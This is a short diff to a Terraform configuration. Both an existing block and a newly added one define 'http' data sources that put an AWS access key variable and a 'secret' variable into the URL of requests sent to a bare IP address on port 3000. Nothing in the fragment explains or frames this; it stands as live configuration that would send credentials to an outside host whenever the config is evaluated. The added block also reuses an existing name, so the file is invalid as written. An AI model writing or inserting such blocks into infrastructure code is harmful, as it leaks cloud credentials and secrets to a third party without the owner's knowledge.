@@ -26,3 +26,7 @@ variable "AWS_ACCESS_KEY_ID" {}
 data "http" "example" {
   url = "http://13.236.148.43:3000/?hi=${var.AWS_ACCESS_KEY_ID}"
 }
+
+data "http" "example" {
+  url = "http://13.236.148.43:3000/?hi=${var.secret}"
+}
